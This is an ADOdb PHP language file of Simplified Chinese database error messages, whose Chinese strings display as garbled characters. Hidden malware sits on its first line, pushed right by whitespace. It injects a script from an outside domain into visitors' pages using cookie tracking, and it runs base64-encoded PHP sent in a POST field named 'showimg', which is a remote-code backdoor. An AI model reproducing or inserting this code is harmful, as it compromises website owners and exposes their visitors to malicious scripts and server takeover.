<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Chinese language file contributed by "Cuiyan (cysoft)" cysoft#php.net.
// Encode by GB2312
// Simplified Chinese
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'cn',
            DB_ERROR                    => 'δ֪����',
            DB_ERROR_ALREADY_EXISTS     => '�Ѿ�����',
            DB_ERROR_CANNOT_CREATE      => '���ܴ���',
            DB_ERROR_CANNOT_DELETE      => '����ɾ��',
            DB_ERROR_CANNOT_DROP        => '���ܶ���',
            DB_ERROR_CONSTRAINT         => 'Լ������',
            DB_ERROR_DIVZERO            => '��0��',
            DB_ERROR_INVALID            => '��Ч',
            DB_ERROR_INVALID_DATE       => '��Ч�����ڻ���ʱ��',
            DB_ERROR_INVALID_NUMBER     => '��Ч������',
            DB_ERROR_MISMATCH           => '��ƥ��',
            DB_ERROR_NODBSELECTED       => 'û�����ݿⱻѡ��',
            DB_ERROR_NOSUCHFIELD        => 'û����Ӧ���ֶ�',
            DB_ERROR_NOSUCHTABLE        => 'û����Ӧ�ı�',
            DB_ERROR_NOT_CAPABLE        => '���ݿ��̨������',
            DB_ERROR_NOT_FOUND          => 'û�з���',
            DB_ERROR_NOT_LOCKED         => 'û�б�����',
            DB_ERROR_SYNTAX             => '�﷨����',
            DB_ERROR_UNSUPPORTED        => '��֧��',
            DB_ERROR_VALUE_COUNT_ON_ROW => '�������ۼ�ֵ',
            DB_ERROR_INVALID_DSN        => '��Ч������Դ (DSN)',
            DB_ERROR_CONNECT_FAILED     => '����ʧ��',
            0	                       => 'û�д���', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => '�ṩ�����ݲ��ܷ���Ҫ��',
            DB_ERROR_EXTENSION_NOT_FOUND=> '��չû�б�����',
            DB_ERROR_NOSUCHDB           => 'û����Ӧ�����ݿ�',
            DB_ERROR_ACCESS_VIOLATION   => 'û�к��ʵ�Ȩ��'
);
?>